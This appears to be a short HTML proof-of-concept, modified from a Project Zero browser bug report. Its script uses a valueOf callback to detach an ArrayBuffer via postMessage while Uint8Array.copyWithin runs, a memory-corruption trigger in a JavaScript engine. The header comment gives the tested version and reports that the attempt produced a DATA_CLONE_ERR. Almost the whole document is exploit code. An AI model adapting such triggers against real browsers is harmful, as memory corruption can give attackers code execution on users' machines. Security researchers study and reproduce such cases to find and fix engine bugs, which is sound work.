<!--
Tested on 5.5.1
Modifed from https://bugs.chromium.org/p/project-zero/issues/detail?id=862
Result: "DATA_CLONE_ERR: DOM Exception 25" and in console: "TypeError: 'undefined' is not an object (evaluating 'a.byteLength')"
-->


<html>
<body>
<script>

f = new function(){
   try{
   alert("t");
   postMessage("test", "http://127.0.0.1", [q])
   alert(a.byteLength);
   alert(q.byteLength);
  } catch(e){
     alert(e.message);
   alert(a.byteLength)
   alert(q.byteLength);
  }
   return 0x22345678;
}

alert(Date);

var q = new ArrayBuffer(0x2000);
var o = {valueOf : f}
var a = new Uint8Array(q);

  // alert(q.byteLength);
var t = [];

a.copyWithin(0x12345678, o, 0x32345678);

console.log(a);

</script>
</body>
</html>
